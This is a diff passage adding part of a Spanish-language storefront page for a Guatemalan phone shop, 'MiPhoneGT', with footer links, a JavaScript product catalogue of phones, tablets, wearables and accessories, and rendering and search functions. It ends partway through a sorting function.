+    <div class="products-grid" id="products-grid"></div>
+
+    <!-- DEALS -->
+    <div class="section-header">
+      <h2 class="section-title" style="">🔥 Ofertas del Día</h2>
+      <a class="see-all" onclick="setNavFilter('ofertas')">Ver todas →</a>
+    </div>
+    <div class="products-grid" id="deals-grid"></div>
+
+  </div>
+
+  <!-- SEARCH RESULTS SECTION -->
+  <div id="search-results-section">
+    <div class="section-header">
+      <h2 class="section-title" id="search-title">Resultados</h2>
+      <a class="see-all" onclick="goHome()">← Inicio</a>
+    </div>
+    <div class="sort-bar">
+      <span id="results-count">0 resultados</span>
+      <select onchange="sortProducts(this.value)">
+        <option value="default">Ordenar por: Relevancia</option>
+        <option value="price-asc">Precio: Menor a Mayor</option>
+        <option value="price-desc">Precio: Mayor a Menor</option>
+        <option value="rating">Mejor Calificados</option>
+        <option value="newest">Más Nuevos</option>
+      </select>
+    </div>
+    <div class="products-grid" id="search-results-grid"></div>
+  </div>
+
+</main>
+
+<!-- FOOTER -->
+<footer>
+  <div class="footer-grid">
+    <div class="footer-brand">
+      <span class="logo" style="-webkit-text-fill-color:initial;background:linear-gradient(135deg,var(--accent),var(--accent2));-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;font-family:Syne,sans-serif;font-weight:800;font-size:1.4rem;">MiPhone<span style="background:linear-gradient(135deg,var(--accent3),#f97316);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;">GT</span></span>
+      <p>Tu tienda de tecnología #1 en Guatemala. Productos originales con garantía oficial, envío express y las mejores cuotas del mercado.</p>
+      <div class="social-links">
+        <a class="social-btn" onclick="showToast('📘 Facebook: @MiPhoneGT')">f</a>
+        <a class="social-btn" onclick="showToast('📸 Instagram: @miphonegt')">📸</a>
+        <a class="social-btn" onclick="showToast('🐦 Twitter: @MiPhoneGT')">𝕏</a>
+        <a class="social-btn" onclick="showToast('💬 WhatsApp: +502 1234-5678')">💬</a>
+        <a class="social-btn" onclick="showToast('📺 YouTube: MiPhoneGT')">▶</a>
+      </div>
+    </div>
+    <div class="footer-col">
+      <h4>Comprar</h4>
+      <a onclick="setNavFilter('iphone')">iPhone</a>
+      <a onclick="setNavFilter('samsung')">Samsung Galaxy</a>
+      <a onclick="setNavFilter('xiaomi')">Xiaomi</a>
+      <a onclick="setNavFilter('tablets')">Tablets</a>
+      <a onclick="setNavFilter('wearables')">Wearables</a>
+      <a onclick="setNavFilter('accesorios')">Accesorios</a>
+      <a onclick="setNavFilter('ofertas')">Ofertas</a>
+    </div>
+    <div class="footer-col">
+      <h4>Ayuda</h4>
+      <a onclick="showToast('📞 Llámanos: 1801-MIPHONE')">Centro de Ayuda</a>
+      <a onclick="showToast('🚚 Rastreo disponible en Mi Cuenta')">Rastrear Pedido</a>
+      <a onclick="showToast('↩️ Devoluciones en 30 días')">Devoluciones</a>
+      <a onclick="showToast('🛡️ Garantía oficial incluida')">Garantías</a>
+      <a onclick="showToast('💳 Cuotas disponibles')">Métodos de Pago</a>
+      <a onclick="showToast('🏪 Próximamente en tienda física')">Tiendas</a>
+    </div>
+    <div class="footer-col">
+      <h4>MiPhoneGT</h4>
+      <a onclick="showToast('ℹ️ Sobre Nosotros')">Sobre Nosotros</a>
+      <a onclick="showToast('💼 Trabaja con nosotros')">Trabaja con Nosotros</a>
+      <a onclick="showToast('📰 Blog de Tecnología')">Blog Tech</a>
+      <a onclick="showToast('🤝 Programa de Afiliados')">Afiliados</a>
+      <a onclick="showToast('📋 Política de Privacidad')">Privacidad</a>
+      <a onclick="showToast('📄 Términos de Servicio')">Términos</a>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2025 MiPhoneGT. Todos los derechos reservados. Guatemala 🇬🇹</span>
+    <div class="payment-icons">
+      <span class="pay-icon">VISA</span>
+      <span class="pay-icon">MC</span>
+      <span class="pay-icon">AmEx</span>
+      <span class="pay-icon">PayPal</span>
+      <span class="pay-icon">Banrural</span>
+    </div>
+  </div>
+</footer>
+
+<script>
+// ============================================================
+// PRODUCTS DATABASE
+// ============================================================
+const products = [
+  // ===== iPHONES =====
+  {
+    id: 'iphone-16-pro-max',
+    brand: 'Apple',
+    name: 'iPhone 16 Pro Max',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-16-pro-finish-select-202409-6-9inch-deserttitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1725379514167',
+    emoji: '📱',
+    category: 'iphone',
+    badge: 'new',
+    badgeText: 'Nuevo',
+    price: 4299,
+    oldPrice: null,
+    rating: 4.9,
+    reviews: 2341,
+    specs: { Pantalla: '6.9" Super Retina XDR', Chip: 'A18 Pro', Cámara: '48MP + 48MP + 12MP', RAM: '8GB', Batería: '4685 mAh', OS: 'iOS 18' },
+    colors: ['#1C1C1E','#E3CDB8','#DBEAFE','#D1FAE5'],
+    storage: ['256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 'iphone-16-pro',
+    brand: 'Apple',
+    name: 'iPhone 16 Pro',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-16-pro-finish-select-202409-6-3inch-deserttitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1725379514343',
+    emoji: '📱',
+    category: 'iphone',
+    badge: 'new',
+    badgeText: 'Nuevo',
+    price: 3699,
+    oldPrice: null,
+    rating: 4.8,
+    reviews: 1890,
+    specs: { Pantalla: '6.3" Super Retina XDR', Chip: 'A18 Pro', Cámara: '48MP + 48MP + 12MP', RAM: '8GB', Batería: '3274 mAh', OS: 'iOS 18' },
+    colors: ['#1C1C1E','#E3CDB8','#DBEAFE','#D1FAE5'],
+    storage: ['128GB','256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 'iphone-16',
+    brand: 'Apple',
+    name: 'iPhone 16',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-16-finish-select-202409-6-1inch-ultramarine?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1723695388515',
+    emoji: '📱',
+    category: 'iphone',
+    badge: 'hot',
+    badgeText: 'Popular',
+    price: 2799,
+    oldPrice: 3199,
+    rating: 4.7,
+    reviews: 3120,
+    specs: { Pantalla: '6.1" Super Retina XDR', Chip: 'A18', Cámara: '48MP + 12MP', RAM: '8GB', Batería: '3561 mAh', OS: 'iOS 18' },
+    colors: ['#000000','#FFFFFF','#FDE68A','#BFDBFE','#F9A8D4'],
+    storage: ['128GB','256GB','512GB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 'iphone-16-plus',
+    brand: 'Apple',
+    name: 'iPhone 16 Plus',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-16-finish-select-202409-6-7inch-pink?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1723695388969',
+    emoji: '📱',
+    category: 'iphone',
+    badge: null,
+    price: 3199,
+    oldPrice: 3599,
+    rating: 4.6,
+    reviews: 890,
+    specs: { Pantalla: '6.7" Super Retina XDR', Chip: 'A18', Cámara: '48MP + 12MP', RAM: '8GB', Batería: '4674 mAh', OS: 'iOS 18' },
+    colors: ['#000000','#FFFFFF','#FDE68A','#BFDBFE','#F9A8D4'],
+    storage: ['128GB','256GB','512GB'],
+    featured: false,
+    deal: false
+  },
+  {
+    id: 'iphone-15-pro-max',
+    brand: 'Apple',
+    name: 'iPhone 15 Pro Max',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-15-pro-finish-select-202309-6-7inch-naturaltitanium?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1692845702708',
+    emoji: '📱',
+    category: 'iphone',
+    badge: 'sale',
+    badgeText: '-22%',
+    price: 3199,
+    oldPrice: 4099,
+    rating: 4.8,
+    reviews: 4521,
+    specs: { Pantalla: '6.7" Super Retina XDR', Chip: 'A17 Pro', Cámara: '48MP + 12MP + 12MP', RAM: '8GB', Batería: '4422 mAh', OS: 'iOS 18' },
+    colors: ['#515151','#E3CDB8','#49454F','#1C1C1E'],
+    storage: ['256GB','512GB','1TB'],
+    featured: false,
+    deal: true
+  },
+  {
+    id: 'iphone-14',
+    brand: 'Apple',
+    name: 'iPhone 14',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/iphone-14-finish-select-202209-6-1inch-blue?wid=5120&hei=2880&fmt=p-jpg&qlt=80&.v=1661026876990',
+    emoji: '📱',
+    category: 'iphone',
+    badge: 'sale',
+    badgeText: '-30%',
+    price: 1899,
+    oldPrice: 2699,
+    rating: 4.5,
+    reviews: 6780,
+    specs: { Pantalla: '6.1" Super Retina XDR', Chip: 'A15 Bionic', Cámara: '12MP + 12MP', RAM: '6GB', Batería: '3279 mAh', OS: 'iOS 18' },
+    colors: ['#1C1C1E','#FFFFFF','#FBBF24','#60A5FA','#F472B6'],
+    storage: ['128GB','256GB','512GB'],
+    featured: false,
+    deal: true
+  },
+
+  // ===== SAMSUNG =====
+  {
+    id: 's25-ultra',
+    brand: 'Samsung',
+    name: 'Galaxy S25 Ultra',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2501/gallery/levant-galaxy-s25-ultra-s938-sm-s938bzahmid-thumb-542282787?$650_519_PNG$',
+    emoji: '📲',
+    category: 'samsung',
+    badge: 'hot',
+    badgeText: 'Hot',
+    price: 3799,
+    oldPrice: null,
+    rating: 4.8,
+    reviews: 2100,
+    specs: { Pantalla: '6.9" Dynamic AMOLED 2X', Chip: 'Snapdragon 8 Elite', Cámara: '200MP + 50MP + 10MP + 50MP', RAM: '12GB', Batería: '5000 mAh', OS: 'Android 15' },
+    colors: ['#1C1C2A','#C4B9AA','#1A3C2F','#5C3A8C'],
+    storage: ['256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 's25-plus',
+    brand: 'Samsung',
+    name: 'Galaxy S25+',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2501/gallery/levant-galaxy-s25-s931-sm-s931bzahmid-thumb-542282741?$650_519_PNG$',
+    emoji: '📲',
+    category: 'samsung',
+    badge: 'new',
+    badgeText: 'Nuevo',
+    price: 2999,
+    oldPrice: null,
+    rating: 4.7,
+    reviews: 980,
+    specs: { Pantalla: '6.7" Dynamic AMOLED 2X', Chip: 'Snapdragon 8 Elite', Cámara: '50MP + 12MP + 10MP', RAM: '12GB', Batería: '4900 mAh', OS: 'Android 15' },
+    colors: ['#1C1C2A','#C4B9AA','#1A3C2F'],
+    storage: ['256GB','512GB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 's25',
+    brand: 'Samsung',
+    name: 'Galaxy S25',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2501/gallery/levant-galaxy-s25-s931-sm-s931bzkhmid-thumb-542282713?$650_519_PNG$',
+    emoji: '📲',
+    category: 'samsung',
+    badge: null,
+    price: 2399,
+    oldPrice: null,
+    rating: 4.6,
+    reviews: 1240,
+    specs: { Pantalla: '6.2" Dynamic AMOLED 2X', Chip: 'Snapdragon 8 Elite', Cámara: '50MP + 12MP + 10MP', RAM: '12GB', Batería: '4000 mAh', OS: 'Android 15' },
+    colors: ['#1C1C2A','#C4B9AA','#1A3C2F'],
+    storage: ['128GB','256GB'],
+    featured: false,
+    deal: false
+  },
+  {
+    id: 'fold6',
+    brand: 'Samsung',
+    name: 'Galaxy Z Fold 6',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2407/gallery/levant-galaxy-z-fold6-f956-sm-f956bzkhmid-thumb-541315950?$650_519_PNG$',
+    emoji: '📂',
+    category: 'samsung',
+    badge: 'top',
+    badgeText: 'Premium',
+    price: 4999,
+    oldPrice: null,
+    rating: 4.7,
+    reviews: 450,
+    specs: { Pantalla: '7.6" Foldable', Chip: 'Snapdragon 8 Gen 3', Cámara: '50MP + 10MP + 12MP', RAM: '12GB', Batería: '4400 mAh', OS: 'Android 14' },
+    colors: ['#1C1C1E','#C4B9AA','#003366'],
+    storage: ['256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 'flip6',
+    brand: 'Samsung',
+    name: 'Galaxy Z Flip 6',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2407/gallery/levant-galaxy-z-flip6-f741-sm-f741bzkhmid-thumb-541231726?$650_519_PNG$',
+    emoji: '📞',
+    category: 'samsung',
+    badge: null,
+    price: 2699,
+    oldPrice: 3199,
+    rating: 4.5,
+    reviews: 670,
+    specs: { Pantalla: '6.7" Flip AMOLED', Chip: 'Snapdragon 8 Gen 3', Cámara: '50MP + 12MP', RAM: '12GB', Batería: '4000 mAh', OS: 'Android 14' },
+    colors: ['#FFD700','#A020F0','#40E0D0','#1C1C1E'],
+    storage: ['256GB'],
+    featured: false,
+    deal: true
+  },
+  {
+    id: 'a55',
+    brand: 'Samsung',
+    name: 'Galaxy A55 5G',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2403/gallery/levant-galaxy-a55-a556-sm-a556ezkamid-thumb-539768999?$650_519_PNG$',
+    emoji: '📲',
+    category: 'samsung',
+    badge: 'popular',
+    badgeText: 'Popular',
+    price: 1199,
+    oldPrice: 1499,
+    rating: 4.4,
+    reviews: 3400,
+    specs: { Pantalla: '6.6" Super AMOLED', Chip: 'Exynos 1480', Cámara: '50MP + 12MP + 5MP', RAM: '8GB', Batería: '5000 mAh', OS: 'Android 14' },
+    colors: ['#003366','#1C1C1E','#E0BFB8','#FFE4E1'],
+    storage: ['128GB','256GB'],
+    featured: false,
+    deal: true
+  },
+
+  // ===== XIAOMI =====
+  {
+    id: 'mi-15-ultra',
+    brand: 'Xiaomi',
+    name: 'Xiaomi 15 Ultra',
+    img: 'https://i02.appmifile.com/mi-com-product/fly-birds/xiaomi-15-ultra/m/1b2f7e9e0f.png',
+    emoji: '📱',
+    category: 'xiaomi',
+    badge: 'new',
+    badgeText: 'Nuevo',
+    price: 3499,
+    oldPrice: null,
+    rating: 4.7,
+    reviews: 540,
+    specs: { Pantalla: '6.73" LTPO AMOLED', Chip: 'Snapdragon 8 Elite', Cámara: '50MP Leica + 200MP', RAM: '16GB', Batería: '6000 mAh', OS: 'Android 15' },
+    colors: ['#1C1C1E','#FFFFFF','#1A3C2F'],
+    storage: ['256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 'mi-14t-pro',
+    brand: 'Xiaomi',
+    name: 'Xiaomi 14T Pro',
+    img: 'https://i02.appmifile.com/mi-com-product/fly-birds/xiaomi-14t-pro/m/6c4e8b2a1d.png',
+    emoji: '📱',
+    category: 'xiaomi',
+    badge: 'hot',
+    badgeText: 'Potente',
+    price: 1999,
+    oldPrice: 2499,
+    rating: 4.6,
+    reviews: 1120,
+    specs: { Pantalla: '6.67" AMOLED 144Hz', Chip: 'Dimensity 9300+', Cámara: '50MP Leica + 50MP', RAM: '12GB', Batería: '5000 mAh', OS: 'Android 14' },
+    colors: ['#1C1C1E','#003366','#C0C0C0'],
+    storage: ['256GB','512GB'],
+    featured: false,
+    deal: false
+  },
+  {
+    id: 'redmi-note-14-pro',
+    brand: 'Xiaomi',
+    name: 'Redmi Note 14 Pro+',
+    img: 'https://i02.appmifile.com/mi-com-product/fly-birds/redmi-note-14-pro-plus/m/redmi_note14_pro_plus_black.png',
+    emoji: '📱',
+    category: 'xiaomi',
+    badge: 'popular',
+    badgeText: 'Oferta',
+    price: 999,
+    oldPrice: 1299,
+    rating: 4.5,
+    reviews: 4500,
+    specs: { Pantalla: '6.67" AMOLED 120Hz', Chip: 'Snapdragon 7s Gen 3', Cámara: '200MP + 8MP + 2MP', RAM: '12GB', Batería: '5110 mAh', OS: 'Android 14' },
+    colors: ['#1C1C1E','#FFFFFF','#8B4513','#4169E1'],
+    storage: ['128GB','256GB','512GB'],
+    featured: false,
+    deal: true
+  },
+
+  // ===== GOOGLE =====
+  {
+    id: 'pixel-9-pro',
+    brand: 'Google',
+    name: 'Pixel 9 Pro XL',
+    img: 'https://store.google.com/us/category/phones/pixel-9-pro/images/pixel9pro-hazel-alt.png',
+    emoji: '📱',
+    category: 'google',
+    badge: 'new',
+    badgeText: 'AI',
+    price: 2599,
+    oldPrice: null,
+    rating: 4.7,
+    reviews: 890,
+    specs: { Pantalla: '6.8" LTPO OLED', Chip: 'Google Tensor G4', Cámara: '50MP + 48MP + 48MP', RAM: '16GB', Batería: '5060 mAh', OS: 'Android 15' },
+    colors: ['#1C1C1E','#FFFFFF','#E0BFB8','#003366'],
+    storage: ['128GB','256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+
+  // ===== TABLETS =====
+  {
+    id: 'ipad-pro-m4',
+    brand: 'Apple',
+    name: 'iPad Pro M4 13"',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/ipad-pro-finish-select-202405-13inch-silver-wifi?wid=5120&hei=2880&fmt=p-jpg&qlt=95&.v=1713920820745',
+    emoji: '📟',
+    category: 'tablets',
+    badge: 'hot',
+    badgeText: 'Oferta',
+    price: 3199,
+    oldPrice: 3799,
+    rating: 4.9,
+    reviews: 1200,
+    specs: { Pantalla: '13" Ultra Retina XDR', Chip: 'M4', Cámara: '12MP Trasera', RAM: '16GB', Batería: '10090 mAh', OS: 'iPadOS 18' },
+    colors: ['#C4B9AA','#1C1C1E'],
+    storage: ['256GB','512GB','1TB','2TB'],
+    featured: true,
+    deal: true
+  },
+  {
+    id: 'ipad-pro-m4-11',
+    brand: 'Apple',
+    name: 'iPad Pro M4 11"',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/ipad-pro-finish-select-202405-11inch-silver-wifi?wid=5120&hei=2880&fmt=p-jpg&qlt=95&.v=1713920820680',
+    emoji: '📟',
+    category: 'tablets',
+    badge: 'new',
+    badgeText: 'Nuevo',
+    price: 2499,
+    oldPrice: null,
+    rating: 4.8,
+    reviews: 780,
+    specs: { Pantalla: '11" Ultra Retina XDR', Chip: 'M4', Cámara: '12MP Trasera', RAM: '8GB', Batería: '7606 mAh', OS: 'iPadOS 18' },
+    colors: ['#C4B9AA','#1C1C1E'],
+    storage: ['256GB','512GB','1TB','2TB'],
+    featured: false,
+    deal: false
+  },
+  {
+    id: 'ipad-air-m3',
+    brand: 'Apple',
+    name: 'iPad Air M3',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/ipad-air-finish-select-gallery-202503-11inch-blue?wid=5120&hei=2880&fmt=p-jpg&qlt=95&.v=1741717928',
+    emoji: '📟',
+    category: 'tablets',
+    badge: null,
+    price: 1799,
+    oldPrice: 2199,
+    rating: 4.7,
+    reviews: 1560,
+    specs: { Pantalla: '11" Liquid Retina', Chip: 'M3', Cámara: '12MP Trasera', RAM: '8GB', Batería: '7606 mAh', OS: 'iPadOS 18' },
+    colors: ['#003366','#E0BFB8','#1C1C1E','#FFFFFF'],
+    storage: ['128GB','256GB','512GB'],
+    featured: false,
+    deal: true
+  },
+  {
+    id: 'samsung-tab-s10',
+    brand: 'Samsung',
+    name: 'Galaxy Tab S10 Ultra',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2408/gallery/levant-galaxy-tab-s10-ultra-x920-sm-x920nzaamid-thumb-541463944?$650_519_PNG$',
+    emoji: '📟',
+    category: 'tablets',
+    badge: 'top',
+    badgeText: 'Premium',
+    price: 2999,
+    oldPrice: null,
+    rating: 4.7,
+    reviews: 670,
+    specs: { Pantalla: '14.6" Dynamic AMOLED 2X', Chip: 'Snapdragon 8 Gen 3', Cámara: '13MP Trasera', RAM: '12GB', Batería: '11200 mAh', OS: 'Android 14' },
+    colors: ['#1C1C2A','#E0BFB8'],
+    storage: ['256GB','512GB','1TB'],
+    featured: true,
+    deal: false
+  },
+  {
+    id: 'xiaomi-pad-7',
+    brand: 'Xiaomi',
+    name: 'Xiaomi Pad 7 Pro',
+    img: 'https://i02.appmifile.com/mi-com-product/fly-birds/xiaomi-pad-7/m/xiaomi_pad7_black.png',
+    emoji: '📟',
+    category: 'tablets',
+    badge: 'sale',
+    badgeText: '-25%',
+    price: 1299,
+    oldPrice: 1749,
+    rating: 4.5,
+    reviews: 890,
+    specs: { Pantalla: '11.2" LCD 144Hz', Chip: 'Snapdragon 8s Gen 3', Cámara: '50MP Trasera', RAM: '12GB', Batería: '8850 mAh', OS: 'Android 14' },
+    colors: ['#1C1C1E','#FFFFFF','#D4AF37'],
+    storage: ['256GB','512GB'],
+    featured: false,
+    deal: true
+  },
+
+  // ===== WEARABLES =====
+  {
+    id: 'apple-watch-ultra2',
+    brand: 'Apple',
+    name: 'Apple Watch Ultra 2',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/MQDY3ref_VW_34FR+watch-case-49-titanium-ultra2-nc-s9_VW_34FR+watch-face-49-alpine-ultra2-s9_VW_34FR?wid=700&hei=700&trim=1&fmt=p-jpg&qlt=95',
+    emoji: '⌚',
+    category: 'wearables',
+    badge: 'top',
+    badgeText: 'Premium',
+    price: 1999,
+    oldPrice: null,
+    rating: 4.9,
+    reviews: 560,
+    specs: { Pantalla: '49mm LTPO OLED', Chip: 'S9', Batería: '36 horas', GPS: 'Triple Band', Material: 'Titanio', OS: 'watchOS 11' },
+    colors: ['#C4B9AA','#F5F5F5'],
+    storage: [],
+    featured: false,
+    deal: false
+  },
+  {
+    id: 'apple-watch-s10',
+    brand: 'Apple',
+    name: 'Apple Watch Series 10',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/watch-case-46-aluminum-jetblack-nc-s10_VW_34FR+watch-face-46-aluminum-jetblack-s10_VW_34FR?wid=700&hei=700&trim=1&fmt=p-jpg&qlt=95',
+    emoji: '⌚',
+    category: 'wearables',
+    badge: 'new',
+    badgeText: 'Nuevo',
+    price: 1099,
+    oldPrice: null,
+    rating: 4.8,
+    reviews: 1100,
+    specs: { Pantalla: '46mm LTPO OLED', Chip: 'S10', Batería: '18 horas', GPS: 'L5 GPS', Material: 'Aluminio', OS: 'watchOS 11' },
+    colors: ['#1C1C1E','#C4B9AA','#003366','#FFD700'],
+    storage: [],
+    featured: false,
+    deal: false
+  },
+  {
+    id: 'samsung-watch7',
+    brand: 'Samsung',
+    name: 'Galaxy Watch 7 Ultra',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2407/gallery/levant-galaxy-watch-ultra-l705-sm-l705fzsaxfe-thumb-541230564?$650_519_PNG$',
+    emoji: '⌚',
+    category: 'wearables',
+    badge: null,
+    price: 899,
+    oldPrice: 1199,
+    rating: 4.7,
+    reviews: 430,
+    specs: { Pantalla: '47mm AMOLED', Chip: 'Exynos W1000', Batería: '60 horas', GPS: 'GPS avanzado', Material: 'Titanio', OS: 'Wear OS 5' },
+    colors: ['#FFFFFF','#FFA500'],
+    storage: [],
+    featured: false,
+    deal: true
+  },
+
+  // ===== ACCESORIOS =====
+  {
+    id: 'airpods-pro2',
+    brand: 'Apple',
+    name: 'AirPods Pro 2',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/MXK73?wid=1144&hei=1144&fmt=jpeg&qlt=90&.v=1724041892084',
+    emoji: '🎧',
+    category: 'accesorios',
+    badge: 'popular',
+    badgeText: 'Popular',
+    price: 599,
+    oldPrice: 749,
+    rating: 4.8,
+    reviews: 8920,
+    specs: { Tipo: 'In-ear ANC', Chip: 'H2', Batería: '30h (estuche)', ANC: 'Cancelación activa', Carga: 'MagSafe / Lightning', OS: 'iOS 18' },
+    colors: ['#FFFFFF'],
+    storage: [],
+    featured: false,
+    deal: true
+  },
+  {
+    id: 'galaxy-buds3',
+    brand: 'Samsung',
+    name: 'Galaxy Buds 3 Pro',
+    img: 'https://images.samsung.com/is/image/samsung/p6pim/levant/2407/gallery/levant-galaxy-buds3-pro-r630-sm-r630nzaamid-thumb-541230459?$650_519_PNG$',
+    emoji: '🎧',
+    category: 'accesorios',
+    badge: null,
+    price: 399,
+    oldPrice: 549,
+    rating: 4.6,
+    reviews: 2300,
+    specs: { Tipo: 'In-ear ANC', Driver: '10mm + Tweeter', Batería: '30h (estuche)', ANC: 'Inteligente', Carga: 'USB-C + Qi', Codec: 'Samsung SSC HiFi' },
+    colors: ['#FFFFFF','#1C1C1E','#D4AF37'],
+    storage: [],
+    featured: false,
+    deal: true
+  },
+  {
+    id: 'magsafe-charger',
+    brand: 'Apple',
+    name: 'MagSafe Charger 25W',
+    img: 'https://store.storeimages.cdn-apple.com/4982/as-images.apple.com/is/MQLN3?wid=1144&hei=1144&fmt=jpeg&qlt=90&.v=1680654891941',
+    emoji: '🔋',
+    category: 'accesorios',
+    badge: null,
+    price: 149,
+    oldPrice: null,
+    rating: 4.7,
+    reviews: 3200,
+    specs: { Potencia: '25W', Compatibilidad: 'iPhone 12+', Cable: '1 metro', Conector: 'USB-C', Certificación: 'MFi Oficial', Color: 'Blanco' },
+    colors: ['#FFFFFF'],
+    storage: [],
+    featured: false,
+    deal: false
+  }
+];
+// ============================================================
+// STATE
+// ============================================================
+let cart = [];
+let currentSlide = 0;
+let slideInterval;
+let currentCategory = 'all';
+let currentModal = null;
+let searchResults = [];
+
+// ============================================================
+// PRODUCT CARD
+// ============================================================
+function makeProductCard(p) {
+  const badgeColors = { new:'badge-new', sale:'badge-sale', hot:'badge-hot', top:'badge-top', popular:'badge-popular' };
+  const discount = p.oldPrice ? Math.round((1 - p.price/p.oldPrice)*100) : 0;
+  
+  const imgHTML = p.img
+    ? `<img src="${p.img}" alt="${p.name}" class="product-img" onerror="this.style.display='none';this.nextElementSibling.style.display='flex';">
+       <span class="product-emoji-fallback" style="display:none;">${p.emoji}</span>`
+    : `<span class="product-emoji">${p.emoji}</span>`;
+
+  return `
+    <div class="product-card" onclick="openProduct('${p.id}')">
+      ${p.badge ? `<div class="product-badge ${badgeColors[p.badge]}">${p.badgeText}</div>` : ''}
+      <button class="wishlist-btn" onclick="event.stopPropagation(); toggleWishlist(this, '${p.id}')">♡</button>
+      <div class="product-img-wrap">
+        ${imgHTML}
+      </div>
+      <div class="product-info">
+        <div class="product-brand">${p.brand}</div>
+        <div class="product-name">${p.name}</div>
+        <div class="product-specs">${formatSpecs(p.specs)}</div>
+        <div class="product-rating">
+          <span class="stars">${getStars(p.rating)}</span>
+          <span class="rating-count">(${p.reviews.toLocaleString()})</span>
+        </div>
+        <div class="product-price-row">
+          <div class="product-price">Q${p.price.toLocaleString()}</div>
+          ${p.oldPrice ? `<div class="product-price-old">Q${p.oldPrice.toLocaleString()}</div>` : ''}
+          ${discount ? `<div class="product-discount">-${discount}%</div>` : ''}
+        </div>
+        <div class="product-delivery">📦 <span class="fast">Envío gratis</span> en 24-48h</div>
+        <button class="add-cart-btn" id="btn-${p.id}" onclick="event.stopPropagation(); addToCart('${p.id}')">
+          🛒 Agregar al Carrito
+        </button>
+      </div>
+    </div>
+  `;
+}
+
+function formatSpecs(specs) {
+  const keys = Object.keys(specs).slice(0, 3);
+  return keys.map(k => `${k}: ${specs[k]}`).join(' · ');
+}
+
+function getStars(r) {
+  const full = Math.floor(r);
+  const half = r % 1 >= 0.5 ? 1 : 0;
+  return '★'.repeat(full) + (half ? '★' : '') + '☆'.repeat(5 - full - half);
+}
+
+// ============================================================
+// RENDER
+// ============================================================
+function renderHome() {
+  const featured = products.filter(p => p.featured);
+  const deals = products.filter(p => p.deal);
+  
+  document.getElementById('products-grid').innerHTML = featured.map(makeProductCard).join('');
+  document.getElementById('deals-grid').innerHTML = deals.map(makeProductCard).join('');
+}
+
+function renderCategory(cat) {
+  const filtered = cat === 'all' ? products : products.filter(p => p.category === cat);
+  
+  document.getElementById('home-content').style.display = 'none';
+  document.getElementById('search-results-section').style.display = 'block';
+  
+  const catNames = {
+    all: 'Todos los Productos',
+    iphone: '📱 iPhone',
+    samsung: '📲 Samsung Galaxy',
+    xiaomi: '📱 Xiaomi',
+    google: '📱 Google Pixel',
+    tablets: '📟 Tablets',
+    wearables: '⌚ Wearables',
+    accesorios: '🎧 Accesorios',
+    ofertas: '🔥 Ofertas del Día'
+  };
+  
+  const display = cat === 'ofertas' ? products.filter(p => p.deal) : filtered;
+  
+  document.getElementById('search-title').textContent = catNames[cat] || cat;
+  document.getElementById('results-count').textContent = `${display.length} productos encontrados`;
+  document.getElementById('search-results-grid').innerHTML = display.map(makeProductCard).join('');
+  window.scrollTo(0,0);
+}
+
+function showAll() {
+  renderCategory('all');
+}
+
+// ============================================================
+// SEARCH
+// ============================================================
+function liveSearch(q) {
+  if (!q.trim()) return;
+}
+
+function doSearch() {
+  const q = document.getElementById('search-input').value.toLowerCase().trim();
+  if (!q) return;
+  
+  const results = products.filter(p => 
+    p.name.toLowerCase().includes(q) ||
+    p.brand.toLowerCase().includes(q) ||
+    p.category.toLowerCase().includes(q) ||
+    Object.values(p.specs).some(v => v.toLowerCase().includes(q))
+  );
+  
+  document.getElementById('home-content').style.display = 'none';
+  document.getElementById('search-results-section').style.display = 'block';
+  document.getElementById('search-title').textContent = `Búsqueda: "${q}"`;
+  document.getElementById('results-count').textContent = `${results.length} resultado${results.length !== 1 ? 's' : ''}`;
+  document.getElementById('search-results-grid').innerHTML = results.length 
+    ? results.map(makeProductCard).join('')
+    : `<div style="grid-column:1/-1;text-align:center;padding:60px 20px;color:var(--text-muted);">
+        <div style="font-size:3rem;margin-bottom:16px;">🔍</div>
+        <h3 style="font-family:Syne,sans-serif;font-size:1.2rem;margin-bottom:8px;">No encontramos resultados</h3>
+        <p>Intenta con otros términos de búsqueda</p>
+      </div>`;
+  window.scrollTo(0,0);
+}
+
+function sortProducts(val) {
+  const grid = document.getElementById('search-results-grid');
+  const cards = [...grid.querySelectorAll('.product-card')];
